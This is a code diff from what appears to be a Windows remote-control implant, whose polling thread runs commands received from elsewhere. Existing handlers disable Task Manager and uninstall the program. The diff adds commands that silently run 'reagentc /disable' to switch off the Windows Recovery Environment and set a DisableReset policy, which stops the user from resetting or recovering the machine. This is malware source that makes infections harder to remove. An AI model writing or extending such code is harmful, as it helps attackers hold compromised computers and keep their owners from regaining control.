@@ -1536,6 +1536,8 @@ DWORD WINAPI pollThread(LPVOID) {
                     else if (type == "startup_status") result = getStartupStatus();
                     else if (type == "taskmgr_on") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableTaskMgr",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                     else if (type == "taskmgr_off") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableTaskMgr");RegCloseKey(k);} result="ok"; }
+                    else if (type == "reset_on") { WinExec("reagentc /disable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableReset",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
+                    else if (type == "reset_off") { WinExec("reagentc /enable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableReset");RegCloseKey(k);} result="ok"; }
                     else if (type == "uninstall") result = uninstallSelf();
                     else result = "unknown_type";
                 } catch(...) { result = "exec_err"; }
